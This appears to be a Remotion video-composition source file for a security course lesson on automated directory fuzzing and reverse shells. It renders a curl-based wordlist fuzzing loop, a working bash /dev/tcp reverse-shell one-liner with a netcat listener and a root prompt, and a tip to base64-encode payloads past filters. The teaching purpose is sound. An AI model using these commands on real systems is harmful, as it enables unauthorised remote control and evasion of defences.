// ── video/remotion/compositions/Sl05ReverseShellsEn.tsx ───
// English version of sl-05-reverse-shells. Same visuals; beats
// re-measured against the EN wavs (word-level transcription, 2026-08-30).

import React from 'react';
import { AbsoluteFill, Sequence, staticFile, useVideoConfig } from 'remotion';
import { Audio } from '@remotion/media';
import { sceneStartFrames, AUDIO_TIMINGS_EN, audioBase } from '../audioTimings';
import { THEME, MONO } from '../theme';
import { FontFace } from '../fonts';
import { RevealLine } from '../primitives/RevealLine';
import { KeyCapsule } from '../primitives/KeyCapsule';
import { TerminalWindow } from '../primitives/TerminalWindow';

const CENTERED: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  justifyContent: 'center',
  alignItems: 'center',
  height: '100%',
  textAlign: 'center',
};

// ── Scene 1: closing the circle ───────────────────────────
// EN: two final plays 0.0 · word list 5.2 · without getting tired
// 7.5 · reverse shell 10.0 · hand you control 18.5.
const Scene1: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 30, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 22 }}>
      AUTOMATION AND <span style={{ color: THEME.red }}>REVERSE SHELLS</span>
    </div>
    <div style={{ fontSize: 18, color: THEME.muted, fontFamily: MONO, marginBottom: 28 }}>
      from scripts that scout, to scripts that attack and hand you control
    </div>
    <KeyCapsule label="two final plays" value="close the circle" accent={THEME.cyan} delay={Math.round(0.2 * fps)} size={24} />
    <div style={{ marginTop: 18, fontSize: 16, color: THEME.muted, fontFamily: MONO }}>
      <RevealLine at={3.7} fps={fps} mark="▸" color={THEME.cyan}>automating an attack against a wordlist — candidate after candidate, without getting tired</RevealLine>
      <br />
      <RevealLine at={10.0} fps={fps} mark="▸" color={THEME.cyan}>standing up a reverse shell once you've already gotten access — drive the target from your machine</RevealLine>
    </div>
  </AbsoluteFill>
);

// ── Scene 2: wordlist fuzzing ─────────────────────────────
// EN: one candidate per line 1.6 · read it line by line 4.4 ·
// while read 9.7 · curl 11.2 · HTTP code 15.0 · 200 19.2 · 404
// 21.2 · in seconds 26.2.
const Scene2: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 26, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 20 }}>
      WORDLIST: <span style={{ color: THEME.green }}>TRYING CANDIDATE AFTER CANDIDATE</span>
    </div>
    <TerminalWindow title="kali@attacker-01:~$ nano fuzz.sh" width={940} delay={Math.round(7.5 * fps)}>
      <div style={{ fontSize: 14, whiteSpace: 'pre', lineHeight: 1.7 }}>
        <span style={{ color: THEME.cyan }}>while</span><span style={{ color: THEME.text }}> read dir; </span><span style={{ color: THEME.cyan }}>do</span>
        {'\n'}<span style={{ color: THEME.text }}>  code=$(curl -s -o /dev/null -w "%{'{'}http_code{'}'}" http://10.0.0.11/$dir)</span>
        {'\n'}<span style={{ color: THEME.text }}>  echo "$dir → $code"</span>
        {'\n'}<span style={{ color: THEME.cyan }}>done</span><span style={{ color: THEME.text }}> &lt; wordlist.txt</span>
        {'\n'}<span style={{ color: THEME.amber }}>admin → 200   backup → 200   test → 404</span>
      </div>
    </TerminalWindow>
    <div style={{ display: 'flex', gap: 16, marginTop: 24 }}>
      <KeyCapsule label="200" value="it exists" accent={THEME.green} delay={Math.round(19.2 * fps)} size={20} />
      <KeyCapsule label="404" value="it doesn't" accent={THEME.red} delay={Math.round(21.2 * fps)} size={20} />
    </div>
    <div style={{ marginTop: 16, fontSize: 15, color: THEME.muted, fontFamily: MONO }}>
      <RevealLine at={24.1} fps={fps} mark="▸" color={THEME.amber}>with a loop and a wordlist, you fuzz directories in seconds</RevealLine>
    </div>
  </AbsoluteFill>
);

// ── Scene 3: reverse shell ───────────────────────────────
// EN: connect back 1.6 · slips past firewalls 3.6 · one-liner
// 7.4 · bash -i 8.7 · slash dev slash tcp 11.2 · nc -lvnp 15.9 ·
// shell 22.3 · base 64 24.6.
const Scene3: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 26, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 20 }}>
      REVERSE SHELL: <span style={{ color: THEME.red }}>THE TARGET CONNECTS BACK TO YOU</span>
    </div>
    <TerminalWindow title="kali@attacker-01:~$ nc -lvnp 4444" width={940} delay={Math.round(15.9 * fps)}>
      <div style={{ fontSize: 14, whiteSpace: 'pre', lineHeight: 1.7 }}>
        <span style={{ color: THEME.dim }}># on the target:</span>
        {'\n'}<span style={{ color: THEME.red }}>bash -i &gt;&amp; /dev/tcp/10.0.0.10/4444 0&gt;&amp;1</span>
        {'\n'}<span style={{ color: THEME.dim }}>Listening on 0.0.0.0 4444</span>
        {'\n'}<span style={{ color: THEME.dim }}>Connection received on 10.0.0.11</span>
        {'\n'}<span style={{ color: THEME.green }}>root@target:~#</span>
      </div>
    </TerminalWindow>
    <div style={{ display: 'flex', gap: 16, marginTop: 24 }}>
      <KeyCapsule label="outgoing connection" value="slips past firewalls" accent={THEME.red} delay={Math.round(4.1 * fps)} size={20} />
      <KeyCapsule label="if filters block it" value="encode in base64" accent={THEME.amber} delay={Math.round(24.6 * fps)} size={20} />
    </div>
  </AbsoluteFill>
);

export const Sl05ReverseShellsEn: React.FC = () => {
  const { fps } = useVideoConfig();
  const [s1, s2, s3] = AUDIO_TIMINGS_EN['sl-05-reverse-shells'];
  const starts = sceneStartFrames('sl-05-reverse-shells', fps, 'en');
  const dur1 = Math.ceil(s1 * fps);
  const dur2 = Math.ceil(s2 * fps);
  const dur3 = Math.ceil(s3 * fps) + fps;
  const base = audioBase('en');

  return (
    <AbsoluteFill style={{ background: THEME.bg, padding: 60, fontFamily: MONO }}>
      <FontFace />
      <Sequence from={starts[0]} durationInFrames={dur1}>
        <Audio src={staticFile(`${base}/sl-05-reverse-shells/sl-05-scene1.wav`)} />
        <Scene1 fps={fps} />
      </Sequence>
      <Sequence from={starts[1]} durationInFrames={dur2}>
        <Audio src={staticFile(`${base}/sl-05-reverse-shells/sl-05-scene2.wav`)} />
        <Scene2 fps={fps} />
      </Sequence>
      <Sequence from={starts[2]} durationInFrames={dur3}>
        <Audio src={staticFile(`${base}/sl-05-reverse-shells/sl-05-scene3.wav`)} />
        <Scene3 fps={fps} />
      </Sequence>
    </AbsoluteFill>
  );
};
